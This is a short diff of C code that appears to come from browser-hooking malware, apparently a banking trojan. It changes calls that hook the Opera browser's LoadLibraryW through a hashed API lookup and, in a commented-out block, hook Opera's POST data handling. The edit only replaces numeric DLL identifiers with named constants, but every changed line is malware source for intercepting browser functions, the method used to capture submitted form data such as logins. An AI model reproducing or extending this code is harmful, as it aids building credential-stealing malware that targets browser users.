@@ -236,7 +236,7 @@ bool HookOperaExe()
 {
 	static const DWORD HashLoadLibraryW = 0xC8AC8030;
 	// Хукаем процедуры загрузки файлов
-	if ( HookApi(1, HashLoadLibraryW, &Hook_LoadLibraryW) )
+	if ( HookApi(DLL_KERNEL32, HashLoadLibraryW, &Hook_LoadLibraryW) )
 	{
 		__asm mov [Real_LoadLibraryW], eax
 	}
@@ -354,7 +354,7 @@ bool HookOperaApi(DWORD HookRVA)
 //
 //        InitializeOperaGlobalData();
 //
-//		if ( HookApi2(14, HookVA, (DWORD)&Hook_GetPostProc ) )
+//		if ( HookApi2(DLL_OPERA, HookVA, (DWORD)&Hook_GetPostProc ) )
 //		{
 //			__asm mov [Real_GetPostProc], eax
 //		}
